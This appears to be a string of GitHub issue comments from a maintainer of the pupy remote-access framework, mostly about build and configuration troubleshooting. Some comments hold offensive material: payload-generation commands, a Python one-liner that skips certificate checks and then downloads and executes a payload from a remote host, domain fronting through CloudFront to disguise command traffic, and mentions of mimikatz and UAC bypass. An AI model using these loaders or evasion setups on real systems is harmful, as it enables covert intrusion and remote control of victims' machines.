Also\nhttps://github.com/alxchk/pupy/wiki/Installation-(Debian-9). Okay, now its clear.\nIm not sure nothing can improve the situation, but yes, this is normal for powershell method. Powershell host with reflected loader eats 300-400 mb of ram. As workaround you can migrate after loading to some other process. \nIn case I have spare time I will look what can cause this, but personally Im very sceptical about using powershell as the stage.. https://github.com/alxchk/pupy/commit/96bbb4f89585eb52cde7c4aaced420201c8c5a04. I changed to unicode, because in other case there will no be any unicode on windows at all. This should work on latest templates (because pp.py/obtain were changed). I'll double check when be at home. > And I may plan to make UI \nThis will not be an easy task. Currently architecture is a bit \"stdio-oriented\". Also tonns of logic in Cmd handler and so on.  Maybe it's better to put efforts in other directions... Well, on my latest head I don't have this, but didn't met earlier either.. Try to decrypt your credentials manually. Looks like pupysh have some issues with communication with gnome-keyring and cant get password from it. \nCurrently file with credentials is encrypted using password. Also there may be situation, when pupysh and pupygen have different ideas about where credentials are stored. Try to check both locations: \n~/.config/pupy/credentials.py and crypto/credentials.py in your pupy or cwd.\nAlso I see now that you use sudo. Then try to check also /root/.config/pupy/credentials.py. creds.json - for credentials extracted from machines\ncredentials.py - for credentials used by pupy\nLogic to select location for credentials.py placement defined in https://github.com/alxchk/pupy/blob/unstable/pupy/pupylib/PupyCredentials.py#L182 and https://github.com/alxchk/pupy/blob/unstable/pupy/pupylib/PupyConfig.py#L122\nTLDR - it tries to get file either from pupy crypto/credentials.py (exactly where you found your file) or home/project directory.\nIt's fine to have credentials.py in your working/pupy directory, so this shouldn't be an issue. You can check that you know right password using this command.\nopenssl enc -d -aes-256-cbc -md md5 -in credentials.py -out credentials.dec.py\nI think your issue because of using sudo + gnome-keyring. Likely you launch sudo to use privileged port, and pupy cant communicate with gnome keyring daemon after that. Try without sudo first. Also you can try to build payload with --debug, and launch pupysh with debug also.\n. ValueError: Template not found (/tmp/pupy/pupy/payload_templates/pupyx64d.lin)\nThis means that you don't have debug template built. You can build python-only payload with something like\n./pupygen.py -f py -o /tmp/test.py --debug connect --host 127.0.0.1:1234 -t ssl\n\nI don't know if it's because of Gnome keyring but lots of times (not always), pupysh is quite long to start (almost as long as metasploit lol).\nMaybe we could add an option on a configuration file to use it or not.\n\nYou can try to check that all external stuff is disabled. By default almost all  is disabled\n[pupyd]\nigd = false\nuse_gnome_keyring = false\nallow_requests_to_external_services = false\nAlso you can check actual config from pupysh (BTW you can generate payloads from pupysh also):\nconfig list pupyd\nIf you want to build templates manually, use\ncd PUPYDIR/clients/sources-linux\n./buildenv.sh\n./build.sh\nTo save your time you can try first with build from CI where all is included already. Take one from here:\nhttps://github.com/alxchk/pupy/releases\n. > Even if these files are sensitive, I don't know if it's necessary to encrypt it. I think it's an heavy process which could be quite painful.\nThis is optional, but enabled by default. If you start pupysh with -NE option it will not encrypt newly generated credentials. Or you can simply decrypt them. If creds are not encrypted, then they will not be reencrypted.. > To save your time you can try first with build from CI where all is included already. Take one from here:\nhttps://github.com/alxchk/pupy/releases\nWell, it turns out that there is a bug in txz generation. Ignore this for an hour >_<. > However, I have tried to generate windows and Linux payloads and no one worked.\nIf it fails with the error line you post here last time (Template not found) this simply mean that templates are not build.  You can either get them from @n1nj4sec pupy-binaries repo, or extract from CI archives. I suggest to use CI's builds or build manually, because now quite a lot of things were done in pp/pupyimporter which requires rebuilds. Also if you try my repo, try unstable branch. It's more recent and stable than master :D. While this doesn't have direct relation to the issue, I would like to notice, that some time ago I had added alternate way to serve payloads -  \nI wrote this code because in my environment it's quite common to have systems where egress connections are limited to one single port, and running additional listener simply doens't work. This functionality have both advantages and disadvantages. The generation code unified and simplified. But http server fully depends on pupy server type. I.e. It's not possible to mix HTTPS (ssl) payload handler with HTTP server.. I merged this into my unstable branch. If you have some time, can you check how things works?. And I'm pretty sure this is address/pointer truncation bug again.\nr8 - 26f195d0130\n(1b60.1444): Access violation - code c0000005 (!!! second chance !!!)\n0000026f`192a68ed 813850450000    cmp     dword ptr [rax],4550h ds:00000000`195d0228=????????. https://github.com/alxchk/pupy/commit/57fdce37b4f985fa789f7edcf205881a0c1ef828. Try pip install --upgrade -r requirements.txt first. I think I fixed that some time ago, but these wasn't merged yet here likely\nhttps://github.com/n1nj4sec/pupy/issues/377. So, you tried to clone my unstable repo, build client template for windows using scripts and after that you have this situation, right?\nCan you execute something other then mimikatz? Like hello world program? Also, can you check, did pupy crashed or just hang?. Well, this doesn't looks like something new (0e989cb8 cutted from r8=000002cc0e989bd0, I'm sure i fixed that ).. \nSo, just to double check - after cloning you build new template using buildenv.sh and build.sh scripts, right?\nI will try on my Windows 10/amd64, but last time I did that it was worked. > Even though there were some errors regarding with wine\nWhat kind of errors? What version of wine do you have?\nBTW, memexec is module, so bundle (windows-amd64.zip) should be recreated first of all. \nSo I suggest to delete whole pupy/payload_templates and client/sources/buildenv before building to be sure the build is clean.\nAlso before trying to launch mimikatz, try to build helloworld (which just prints hello world) and check with it. There is some kind of issue with interactive stdin/stdout, so better to check with small pieces.. Try to build with --debug.\nLikely fails because of this: https://github.com/alxchk/pupy/commit/0238d7c610622671821bdab5ecc37751d8b20dc9. You can try to test android build from my repo. I created bootstrap for the new buildozer (0.33), and it even work for me :D. Well.. Looks like you need to install build-essential or alternative set of packages into your distro to be able to compile those stuff.. It's ok. Buildozer is quite stupid and didn't search for unsigned apk file (It searchs for Android-0.1-release.apk., but without signing it's only Android-0.1-release-unsigned.apk there). There is build.sh script which copies that apk to pupy_templates. Somehow I misread the text.  There should be Wi-Fi-0.1-release-unsigned.apk\nInteresting, where this Android came from. . Yes.. APK generation is not ready in docker image now. Now it should works (but keystore should be generated manually). FYI I added these changes to my unstable branch (which is buggy and highly experemental)\nhttps://github.com/alxchk/pupy/commit/4a558331f58ae9ae7538d43bc486775de1640a64\nWork for me! THX. Very unlikely this will work out of the box. There is no proper TLS wrapping in the current transports. So you need to modify one, like ws. BTW. Isn't domain fronting dead? I thought major CDNs block this now. Which options are still available?. Yeah, really...\nOkay, so I pushed PoC version of WS transport wrapped to TLS. I checked this once with Amazon CF.\nRight now its a bit fresh, also I may break something else, who knows..\nTo try to use this you need dfws transport for client and ws transport for server, like this (example):\ngen --debug -o /tmp/xx.py -f py connect --host cdn.atlassian.com:443 \n         -t dfws host=XXXXXXXXX.cloudfront.net\nYou can add ws to server at runtime with \nlistener -a ws\nIn case of CF you need to set expected user agent to Amazon CloudFront.\nBecause of unobvious bug with arguments parsing, you need to quote quotes, like this:\nlisten -a ws 8081 \\\"user-agent=Amazon CloudFront\\\"\nor\nlisten -a ws '8081 \"user-agent=Amazon CloudFront\"'\nOrigin in CF for this case was configured as HTTP only. HTTPS will not work right now.. Try android payload from my unstable tree - https://github.com/alxchk/pupy.\nIt was moved to the new buildozer/p4a toolchain. Well.. Once upon a time there was a bug.. :). Try this, and let me know, is it working or not:\nhttps://github.com/alxchk/pupy/commit/743a20cc44587f48572ea26ceeb3f665fb4197cc. You need to be sure you either loaded your module manually (prior to reference it from self.client.conn.modules), or added it to dependencies. It is possible to have shared port for http server and non-https tcp payload (rsa,ec4,obfs and so on). But command which generates py oneliner doesn't use this functionality.\n. Technically it's possible, but this will require refactoring. Personally I don't like ssl/tls for this kind of stuff at all (also ssl api is horrible in python 2.7), so I'm not going to do anything about that.\nAlso you can try to use ssl transport with https server to serve payloads, but to be useful you need to disable client side validation in config file. Something which works will looks like this:\n```\n\n\nconfig set pupyd transport ssl\nconfig set pupyd httpd true\nconfig set ssl client_cert_required false\nconfig set httpd secret true (optionally)\nconfig save -wr\ngen -f py (for example)\n...\nONELINER: ... (this will not work :D )\n\n\nThe variant which will work:\npython -c 'import urllib2,ssl; ctx=ssl.create_default_context(); \\\nctx.check_hostname = False;ctx.verify_mode = ssl.CERT_NONE;exec urllib2.urlopen( \\\n\"https://HOST:PORT/PAYLOAD_PART\", context=ctx).read()'\n. Payload part shown during generation (when you do this from pupysh). Yes. With httpd enabled it starts serving (in very simple way) data/wwwroot folder as web root. On each connection it checks first, is this GET request, and if it is, tries to serve it. If not, it will treat traffic as pupy transport data and pass it up the stack.. You enabledconfig set httpd secret truewhich requires to access files with some random (per pupysh session) prefix. In your case \"TNmee\".\nIf you generate payload from pupysh with default output with configured httpd, it will place generated file in data/wwwroot and it will show you how to access payload (\"WWW URI PATH:\" in the output). \n. Use pypysh, not pupygen. Usual args, like -f py or whatever you like. https://github.com/n1nj4sec/pupy/issues/447#issuecomment-318280434. How do you think? In pupysh of course.. You need to enable logging (either in config or for one command):run -o /tmp/output.json interactive_shell -R asciinema``. In case logs enabled in config separate file will be created for each command output. There is no entire session recording.. There is no need to do this. Impacket doesnt contain any binary modules, so may be loaded from system path. run psexec .... client/sources. Not an easy question. The logic in ssl server should be changed to not to check the role of the neighbor. Or better to add some kind of SNI checking to use different certs for https and control connection. Originally there is a check that ensures that neighbor role is not the same as yours. Cause in case of one client compromise youll be able to perform mitm attack to the rest clients which is not good.\nAre you really need this during pentest?. The logic is in pupy/network/lib/clients.py - PupySSLClient and\npupy/network/transports/ssl/conf.py - PupySSLAuthenticator (server side).\nYou can try to tune it according to your needs. Just remember to rebuild templates.. You can try to start with disabling client_cert_required:config -w set ssl client_cert_required false`\nThen, if it's not enough you can try to remove all checks completely with replacing\ncert_reqs=self.cert_reqs with cert_reqs=ssl.CERT_NONE\nYou can check python ssl module documentation in case something will not work (https://docs.python.org/2/library/ssl.html)\n. It's because somehow you have PyCParser version which doesn't support -OO. You need version 2.17. Check requirements.txt. Or better pull from unstable branch, remove environments and build windows one again.. This means ssl_authenticator (pupy/network/transports/ssl/conf.py) failed. Ensure client_cert_required is set to false, cert_reqs set to ssl.CERT_NONE. Because this works on pupysh side you don't need to rebuild anything, just restart pupysh. Feel free to add prints to check that these variables set to expected values.. ~~ OH.. Necropost ~~\nI did some refactoring to make output more abstract. But still, there can be a lot of issues. You need to implement PupyCmd class. Very unlikely the process will be fluent :)\nMost of modules now uses \"objects\" instead of plain text. The description of such \"objects\" are in the PupyOutput module. Rendering of such objects to the ANSI terminal done with hint_to_text function.\nSo you should do something like that.\n1. Add option to specify GUI, create your loop like this and put this here\n2. Implement your handler with same interface as PupyCmd\n3. Add renderer for PupyOutput objects.\n4. Ensure you implemented renderers for all output modes\n5. ??? ... ???\n6. PROFIT\nIn case you are really ready to put your time for this, please let us now about your refactoring efforts.\nN1nj4sec's PoC was done before refactoring, so is outdated.. Personally I don't like this. Migration changes the state, and at my opinion this should be done explicitly.. > thereby keeping network traffic to a minimum.\nPupy is very inefficient in meaning of network traffic. Also this patch simply do the same - this is just migration with new connection.. It has connect command. mimikatz_powershell usually useless on recent win10 stations. Why to use it anyway?. Memstrings is broken on windows but should work on linux (if you have ptrace or root privilege). Next month I should have some time and fix all the things in pupy :)). > Any thoughts on migrating to python3?\nYes, no way. It's more fat than python2 =\\\nAlso no profit.. > Citation needed.\nI tried. You can try yourself and make measurements.\n\nBesides they are both fat and at this point difference is negligible.\n\nLast year I tried to reduce memory consumption and fight for every megabyte. \n\nProper unicode support and fstrings alone are great profit.\n\nWell, python3 add even more improvements than that, this is true. But it's more important for those \"high profile projects\". In fact most security scripts (which we try to adopt to pupy from time to time) is written for python2 only.  Even big ones like impacket. But impacket will be ported properly some time later, rest are very unlikely. We are not going to use pupy to run django, right?\nIf you take closer look on pupy, you'll find that large parts are written on ctypes, not python :) Rest are mostly workarounds and hacks (mostly because of RPyC). The code which is reliable mostly ugly. Maybe pupysh rewritten to the python3 can make sense, but python2 and python3 are incompatible when using rpyc. So.. Personally I don't see any reason to put tonns of efforts to migrate. If somebody do - he can try.. Wow. It's nice to have feature, when your payload exits if decoding failed (=\nIt's better do change sys.exit to raise. Maybe it's better to improve standard log option to store log in --bg? This will be useful for other commands as well... https://github.com/alxchk/pupy/commit/3cbf5400f0e8caa7297c6ba79e91d486878497de. Hi!\nLooks like you are interested in bypassuac now... Did you ever try to use UACME? Maybe it's worth to try to integrate UACME to pupy? At least it's always up2date and usually works with recent builds.. > I don't understand the purpose of the proxy directory\nThe proxy goes to the trusted server and works as listener for inbound connections.\nI.e. \nYou -----> [ Trusted server :1337 ] <----- payload\nIt's only for communication, so your keys etc stays on pupysh (only exception is SSL).\nThe purpose is to ensure low latency for KCP (which will be converted by proxy to TCP) and solve various issues with NAT in enterprise environment (i.e. when there is no router with upnp which will setup port mappings for you).\n\nhad to patch the source code to launch multiple pupy servers because right now, it is not possible, the web server listens on a hardcoded port.\n\nRight now pupysh in alxchk/pupy can do multiple listeners (I don't use that stuff with oneliners and rest like this, so it's only about listeners), but for another purpose - to be able to communicate via different encapsulation protocols. It means that it's not possible to start multiple listeners for the same protocol for now. \n\nAnd I have noticed, that pupy is not designed to work with multiple users.\nSo maybe it would be interesting to implement an api or something like that (not necessary a web gui) to communicate with multiple users on an unique daemon. In my point of view, this is something, we should\nthink about a solution.\n\nTechnically pupysh can be separated to daemon part and client part. In alxchk/pupy almost finished separation handler from server, so likely client-server approach may be done.\nI'm not interested in this right now, and likely will work on \"virtual sockets\" in case I'll have spare time.\nSo it's up to you (how) to do this ^^ But in case you really going to do this let's discuss to build right architecture.\n. > It means that the network is decrypted on the server and send it back to our desk in cleartext (I suppose no, but I try to find the reason to add the SSL configuration).\nWhy adding the SSL configuration on the server instead of forwarding the traffic as a classic proxy (such as a TCP raw) ?\nActually I don't use SSL at all, and this was added because I was uncomfortable to have ssl over ssl.... :D\nAnd yes, pupy to proxy goes over SSL with pregenerated  CA/Client/Server certs to not to reinvent a wheel :)\n. https://github.com/PowerShellMafia/PowerSploit/pull/289\nAt least pupy/external/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1 should be updated. Hi! Upstream project belongs to @n1nj4sec, I can only commit to my branch. Ill test this on W10 this week. You need to have docker, which you can control with user which will build pupy.\nAlso you need to have vsyscall support, either native or emulated ( required to build linux/64 target).\nNext steps depends on how much you are going to trust builds generated by travis automatically.\nYou may want to build toolchain by yourself (https://github.com/alxchk/docker-old-tc-bootstrap -- for Linux environment, https://github.com/alxchk/docker-old-tc -- pupy build environment).\nThen you may want to look into build-docker.sh script and client/build-docker.sh script. It should work as is, but depends on environment some manual fixes may be required.\nGenerally you can just fire \ncd pupy-git-dir; sh build-docker.sh\nor in case you want to use toolchain from your machine:\ncd pupy-git-dir; sh REPO=\"\" build-docker.sh\nAfter first full successful build you can easily rebuild targets with \ndocker start -a build-pupy-linux64\netc\nDon't use for evil things, study research only ^^\n. You should clone repo recursively (--recurisve option, or git submodule init && git submodule update).\n. https://github.com/n1nj4sec/pupy/pull/594. Well, \ndocker start -a build-pupy-linux64\nshould be used to REbuild some target. To actually use pupy you need to install missing dependencies (pupy/requirements.txt) or use script create-workspace.py (likely you will need to fix something there) which will create virtualenv folder and workdir for pupy to not add garbage to your main system. \nThere is (was?) known issue with Debian/M2Crypto, so in case something related to M2Crypto will cause exceptions just uninstall one from pip and install one which is shipped with distro.. Rpyc has been updated with incompatible API changes. rpyc==3.4.4 should be used, as last compatible. You can enable debug (logging DEBUG command) or --log-level DEBUG. Client may be built with debug either.. Looks like certificates are different between client and server.\nYou can start pupysh with --log-level INFO and check paths where certs are loaded (INFO:pupy.credentials:Reading credentials from). There will be several paths, latest overwrites first. You can check the content. Likely previously other storage was used. You can try to search for credentials.py in various places - workdir/crypto where you usually start pupy, ~/.config/pupy etc.. Maybe the creds are different? In case of ssl transport you can record traffic with wireshark and compare hello messages . > What do you think?\nWell, I don't see much reasons to do that. There is no much activity around the project anyway.\n\nI suggest duplicating the repository and renaming it to something indicative of progression (i.e. \"pupy2\")\n\n\n\nTo search for pupy2 you need to know that pupy2 exists. With github platform it was very easy to observe a progress in forks with \"network\" feature. Recently it became too many forks of pupy so this nice feature doesn't work anymore. Funny, but most of these forks are forks without own commits. \n\n\nSince you know that there is a bit more alive (and no more than that) branch exists nobody prevents to use it. The nice example is rtl8812au driver, which have tons of forks which all are different and you can select something more appropriate for your usecase.\n\n\nBranch was created a long time ago. From that time there are 0 issues and 0 pull requests which clearly shows no future of this initiative.\n\n\n\nIt is difficult for newcomers to figure out which is the most up to date branch of the project, creating needless headache for everyone.\n\nMaybe it's not that bad? Pupy is not well-known project like metasploit which everybody will say in some case - ah, this is just meterpreter.  Maybe it's better that the user of the project will know at least a little bit of what is he using, what is the story, how the thing works and what kind of help is required. For my opinion in case you are doing some pentest job you absolutely need to do this anyway. You can't afford to blindly trust the first thing you just cloned from the github. In the end you are going to apply this to your customer. \n\nAs an aside, I would also recommend having two branches, (main and unstable) instead of just unstable, which is how you currently have it.\n\nI can change the name or add the branch but this will not change the content. To keep something stable during refactoring tests need to be created and some QA to be performed to check regressions and so on. \n. > At the top of the screen, I see no \"issues\" tab.\nYou are right. Either this was disabled by default or I disabled and forgot about that.. > Will there be a Documentation in the future?\nWithout this request - very unlikely :) Maybe raise an issue and I will write some generic things to the wiki.\nThis is really unobvious thing.. Well, we can try, why not. \nActually right now pending PRs are not compatible with my branch (so with \"alpha\" here as well).. My branch is not synced to the head of current unstable branch, it's actually 7 commits behind. This is not that bad, but I need to review what is missing. Likely merge will not be hard. But there are some large PRs which also changed a lot of things, like https://github.com/n1nj4sec/pupy/pull/568. Likely compatible commits should be cherry-picked, without full merge. Also I  cherry-picked some fixes from other PRs some time ago, like https://github.com/alxchk/pupy/commit/2f2bab378e613f6443aed3d74f510ffb8e0ee03d. I merged what I can. Result should work but tests needed. I also started to write some notes about pupy. WIP, but better than nothing.\nhttps://github.com/n1nj4sec/pupy/blob/unstable/pupy/DEVELOPMENT.md. Looks like this file can be deleted. AFAIR http transport is a bit broken in this branch. Right now pupy doesn't have stable support for half-duplex channels like http. In this branch http transport simply wraps packets with HTTP headers, but didn't honor the protocol. So in case you try to communicate via HTTP proxy this will never work. You can try to use branch (https://github.com/alxchk/pupy/). http transport was rewritten there, so it may work via proxy. But it's very slow. Best choice to use websocket transport if it's not possible to use ec4/rsa.. Technically this may be possible, but why to do that?\nActually there are two main things why pupy for linux looks this way.\n1. Kernel ABI workarounds (like vsyscall presence/absence).\n2. Easy interfacing with system (dbus, libX11 etc).\n3. Custom ELF/SO loader should be written to load modules to static base image.\n. https://github.com/n1nj4sec/pupy/pull/610. Well.. Its absolutely unclear what is going on. You can enable enable debug for pupysh and client, then submit logs.. Try to enable debug (on client side, --debug).\nAlso don't use http transport if you can, it's horrible and slow.\nYou can also specifty the protol explicitly (socks5://127.0.0.1:39039), but socks5 should be default, so it doesn't matter.\n. Pupysh works in termux. Client can be built as apk. Should work also... Strange, umsgpack is bundled with pupy (because \"fixed\" a bit). OOOps. I throw away that bundle during docker build >_<. kcp was not recursively cloned during git clone for some reason. Ensure to checkout all the things . Readme should be updated..\nhttps://github.com/alxchk/pupy/wiki/Installation-(Debian-9)\n. Docker used as toolchain chroot to compile payloads. Docker also can be used to run pupysh. These are two completely different things . What versions of python/pip do you have?. Looks like something wrong with pycryprodome. Try to reinstall it (force if required). I didn't check android version for a while, so there can really be something broken.. Android known to be broken, and I'm currently working to fix this. There are a lot of things to do... I pushed updated version, so you can try. In case there are exceptions and errors, please upload logs from logcat and pupysh. > What phone or VM are you testing this on? What version of Android is it running? What processor architecture, ARMv7 or x86?\nBTW. Because Android target is something like PoC, likely you should tune it by yourself. Default build is for ARMv7. This is configured here. Actually I didn't try to build on x86, but likely should work.\nPupy for android is simply pure python payload wrapped with python-for-android.. Okay, several things here.\nFirst - please don't use sudo and privileged account for to build pupy or start pupysh.\nSecond - please try to setup workspace properly\nThird - payload_templates repo/releases should not be used. You should always recompile templates after git pull.\nOnce you properly installed pupy, you can recompile template with \ndocker start -a build-pupy-**TARGET**\nYou can check prepared docker containers with \ndocker ps -a | grep build-pupy-. I pushed update for create-workspace.py just now. It may happen that incorrect build-docker.sh was executed (yes, there are several scripts with same name there >_< ).\nIn case this will not help, you can try to add set -x right after set -e to see more output or execute commands from script manually to find out what is going wrong. In your case looks like build tc-linux64 has been failed, while tc-linux32 was successful. Do you have vsyscall emulation support?\nTry to pass vsyscall=emulate to kernel command line (you need to reboot)\nhttps://einsteinathome.org/content/vsyscall-now-disabled-latest-linux-distros\nhttps://lwn.net/Articles/446528/\n. Some info can be found in wiki between ----- BEGIN IMPORTANT ----- and ----- END IMPORTANT -----.\n. > Also, is there a way to detect whether it is enabled or not?\nThat I don't know. You can check your kernel config, if you have one. But if you have more or less recent kernel vsyscall is disabled by default.. > I can also confirm that the latest commit has not fixed the crashing issue.\nThis may have relation to vsyscall issue only if you have tc-linux32 built successfully and tc-linux64 failed.\nThis only affects tc-linux64.. Lets clarify. So you both do have QubesOS, and both have same issue - tc-linux64 crashed while tc-linux32 works? Is this true?\nDoes this works for you?\n```\n\ndocker run -it --name test64 tc-linux64 /bin/bash \naff560904e98:/build/workspace/project# id \nuid=0(root) gid=0(root)\naff560904e98:/build/workspace/project# \n```\n\n. The same with tc-linux32 works?\nIn that case it's very likely some ABI issue. Are you absolutely sure that argument was applied? Can you check /proc/cmdline from the shell executed using that kernel? You can also try to add nokaslr\nhttps://github.com/QubesOS/qubes-issues/issues/2045#issuecomment-227289726. You can try to add \napt-get install -y strace\nstrace -ff -o python-log python -m pip install --upgrade pip\nto build-docker.sh.\nThen start docker start -a build-pupy-linux64\n. According to your records you have issues during windows build. But previously you showed issues with linux64 build. Maybe open another issue to not to fill this one with offtopic things... Just install openjdk.\nfind /usr/lib -executable -name jarsigner\n. > I also propose implementing a release system similar to Powershell Empire. All modifications should be made to the unstable branch, regression tested, and then merged into master. This will make my job easier, because I have been doing a lot of the regression testing, but it is hard to do so because there is no release system. If I know that there will be a release that will be \"frozen\" until the next one (a la Debian), then I can specifically do all tests on that one.\nThis is surely best way to do something. The only issue to have manpower to do proper regression testing. We don't have any unit or integration tests, so this will be really painfull thing.  I pushed flake8 checker with huge ignore list. This should be starting point to stabilize.\n\nAnother problem with the docker images is the build process. The way I am guessing it currently works is that the image is built from scratch each time.\n\nWell, docker layers quite useless, so don't expect to reduce load size. The image will be different from the point where pupy copied to the system. This includes dev packages installed to build python deps and so on. If you have idea how to make this more efficient  - you can try.\n\nOne way to potentially solve the layering issue would be to build the base image once, and then have all subsequent builds simply pull the latest git commit. That is what many of us are doing manually anyway, so it makes sense. This way, all subsequent pulls do not waste bandwidth by trying to download the whole rebuilt image. This may be harder than I make it out to be, I am not a docker expert.\n\nThe idea of this docker image to have clean system from some stateless point.\n\nThis is problematic, because that means I have to pull ~1.14GB of data each time I want to get the latest version.\n\nIn case of active depelopment it's preferable to have non-docker deployment. Docker is more about fire-and-run. > That would be great, but the Debian 9 installation process is still broken on my end. I have not tested it lately, but last I checked it was dysfunctional.\nRight now it's also broken because of Lazagne dep. > I am going based on the title, I did not sufficiently understand the actual change to evaluate it properly.\nThis is just workaround for stupid pip+keyboard bugs, nothing more.\n\nAlso, I think that we should officially support only Debian 9 and Kali. If @alxchk is in agreement, can I update the README and wiki to reflect this?\n\nYou can, why not. pupysh should work everywhere with python 2.7.15 and openssl 1.0 anyway... > can I have carte blanche permission to edit anything documentation related however I want? \nSure. We don't have documentation anyway :) In case something incorrect Ill fix.\n\nWhy not just use docker attach  instead?\n\nIf it works as expected - why not. > I am at a complete loss as to why this VM keeps crashing. \nTry to debug this. Don't use build-docker.sh, manually repeate commands. Try to add strace during executing things at container. Read the logs (dmesg, syslog etc). Save strace log and so on. Oh. There is tmux in docker. Try to use Ctrl+B PgUp. > Also do the ls, pwd, etc commands only work when a client is connected? The help modules are there but it keeps telling me that it doesn't recognize those commands but the I see the 3 August bug report says they are working.\nYes. If there is no connection which supports module it will say that command was not recognized. dnscnc is very special launcher, it requires proper setup and does not provide interactive communication channel. What exact steps did you done? . Nope. Can you show some example? What you specify, what expected and what happens?. Looks like default payload_output  is absent in default config which goes to docker (conf/pupy.conf.docker). Try to set it manually to something meaningful with\nconfig set paths payload_output /some/folder\nIf it works I'll set/change default value for docker.. There is nothing different in pupy in docker and pupy outside docker. You can try to enable logging to see which configs are used, also you can use config list to check actual config\n. Well.. You need to see info about config loading, so you should execute pupysh with --log-level DEBUG. You are right. There wasn't logging in PupyConfig. \nSomehow I overlooked that you are using your local way of working with pupy/docker. SSH version used non-privilged user, and docker environment configured in this way. I changed instructions in wiki a bit. Please follow.\nThe issue https://github.com/n1nj4sec/pupy/issues/667 also has same roots.. This because docker (user ctx) doesn't have access to /tmp/projects. What is your id? Right now internal docker user mapped to UID=1000. As simple workaround you can either chown all the things to uid=1000 at /tmp/projects or chmod 777  /tmp/projects.\nAlso you can try to tune your docker to such setup (https://blog.ippon.tech/docker-and-permission-management/). In case of success please update the wiki.. Looks like impacket with new requirements.txt is not in the pip yet. Let me bump the build with the one from the master... It is automatic. .txz uploaded each successfull build. Download and check dates.. Sure it will break everything. Ssh related stuff is openssh-server, authorized_keys, entry point file, ssh_client checking in .bashrc. That's all. \nAlso I don't see any reason to touch this Dockerfile. If you want compose - create own set of things. Maybe even in separate repo.. Well, SSH was there for \"cloud\" deployment (i.e. not to use this at localhost).\npupy.conf was there because of difference in defaults.\ncapability.conf was just in case.\nAlso pupysh should work from unprivileged user.\nImage should be immutable (i.e. workdir should not be /opt/pupy).\nAnd so on.\n. > Why would you have SSH in the Docker container though\nBecause \"regular\" user should not he able to control dockerd.\n\nWon't it fall back to the local pupy.conf.default file\n\nIt will but check the diff.\n\nThere is no reason whatsoever why it should work from an unprivileged user in a docker container\n\nLeast privileges principle.\nAnyway, there can be different threat models. Personally I have reason to like this one, but I'm not against to add more options. To add, not to replace.\n. > They already can control dockerd, that is part of the installation instructions, (usermod -aG docker user).\nThe user who access the container via SSH and user who maintains the system may/should be different in this case. User who has access to docker can/may escalate privileges.\n\nYou have a point. Even if I add it though, I still think the compose method should be the standard way to deploy.\n\nWe can move Dockerfiles to some \"recipes\" folder and add scripts to select/use any from that set.\n. > is it a problem with python for android?\nIt's problem with absense of jarsigner.\n```\n\ndpkg -S jarsigner                                                                                                                                                                                        \nbash-completion: /usr/share/bash-completion/completions/jarsigner\nopenjdk-8-jdk-headless:i386: /usr/lib/jvm/java-8-openjdk-i386/man/man1/jarsigner.1.gz\nopenjdk-8-jdk-headless:i386: /usr/lib/jvm/java-8-openjdk-i386/bin/jarsigner\nopenjdk-8-jdk-headless:i386: /usr/lib/jvm/java-8-openjdk-i386/man/ja_JP.UTF-8/man1/jarsigner.1.gz\n```\n\n```\n\nls -l /usr/bin/jarsigner\nlrwxrwxrwx 1 root 27 Jan 13  2017 /usr/bin/jarsigner -> /etc/alternatives/jarsigner\n. Can you add some examples here?. Well.. Unlikely. The client itself checks the cert same way... Hi! I merged this to my branch. \nHere is small issue. Initially this 8443 was used, because ssl enabled by default, and by default pupysh executed with non-root user. So, by default nothing works, because there are no rights to bind to 443.\nMaybe it's worth to fix this somehow? Like make  these ports configurable for ps1_oneliner? Also personally I don't like separate web responder for that, but that's another story... Well, setuid means that you already run python as root..\nIt's better to have default for ports > 1024 and make them easily configurable via config file. They are no longer available. You should try to use [these instructions](https://github.com/n1nj4sec/pupy/wiki/Installation-(Debian-9)).\nZ:\\build\\workspace\\project\\client\\sources\\pupy.c : fatal error C1002: compiler is out of heap space in pass 2\n```\n\nLooks like issue with free memory. Do you have enough?. Either\napt-get install libfuse2\nOr\npull from https://github.com/alxchk/pupy\nOr\npull latest docker image. Use forward. portfwd and socks5proxy are two old pure python modules with low reliability and performance. There is one new (well, it's already there for second year) which uses libuv. Quite fast and more reliable. Use that module if it's possible.\nModules with low reliability were marked as \"dangerous\". You can still enable them in config, but I suggest to not to do that unless you absolutely sure what you are doing.. Use module forward.\n```\n\nhelp forward\n```. > How to enable portfwd and socks5proxy in configuration???\n\nChange enable_dangerous_modules = false to true.\n\nhave two sessions,one of them can use forward,another is not allowed to use forward\n\nLooks like libraries were not loaded at second session. What is the client/target?\n. Don't have any idea without additional information. You can build/run client with --debug option and upload log. Maybe some info will be found there. There is PR \"beacon delay\". You can try to check is it works and adopt to current upstream. It's better to have this configurable somehow. Adding this parameters to config is better option IMHO. Default pupy's initialization does not generate key for signing APKs. So this crypto/pupy-apk-release-key.keystore likely either missing or empty. Well.. likely no. Like any other key to sign apk. Password is pupyp4ssword, so maybe check that. Also try to execute jarsigner manually to check it actually can sign something . Yeah.. I pushed head of my branch to upsteram. PS may be broken after merge, write an issue please ^^. You can mount some external folder to the output folder, or use docker cp, or use scp. I changed https://github.com/n1nj4sec/pupy/wiki/Installation-(Docker)#installation a bit. Please try.. You are using pure python agent? Injection code stays in client only. Maybe I should reuse pupyimporter code... In docker pupy do have uid 1000. So all files in projects (if they existed already) should be owned by this uid.\n\nGoddamn I hate this docker bullshit. The old pupy without docker was so much better.\n\nThen why to use it?\n. Can you provide some sequence to show what are you trying to achieve?\n. Ok, you probably trying to use shell after become. I see. The issue here that glibc openpty implementation do have stupid way of chowning newly crated pty device. It checks UID (not EUID). UID == 0, so it tries to chown device with EUID != 0 thus failed. \nTry this - https://github.com/alxchk/pupy/commit/0bb65cd1ee11ed4ac5876f9a4e80b2ce66c6071b\n. It's because of a bit silly UI. gen \"blocks\" until you press ^C. And you should press ^C when you got a session.. Some day we'll rework this... There are two types of \"autorun\".\n\nscriptlets - embedded to client during generation. This thing executed independently of connection to the pupysh.\nevent handlers. Once client connected to pupysh, pupysh fires on_connect event. To run command on this event you should add to config something like this:\n\n```\n\nconfig on_connect my_nice_client ls\n```\n\nwhere my_nice_client is either tag or node or any other filter. To run something on every client you can use any. Instead of command you can also use include:section_name statement. This can be found from PupyTriggers.py. ttyrec will work only on Linux and on very recent kernels. \nThis thing uses kprobes kernel API which is very new thing.\nIt /may/ work with >=3.16, it works (but in some cases may crash kernel x_x) with >= 4.9, and looks stable with >= 4.14.. According to your message LaZagne loaded to client is older than interface in modules. Likely you have been updated very short time ago. You probably should unload old module first 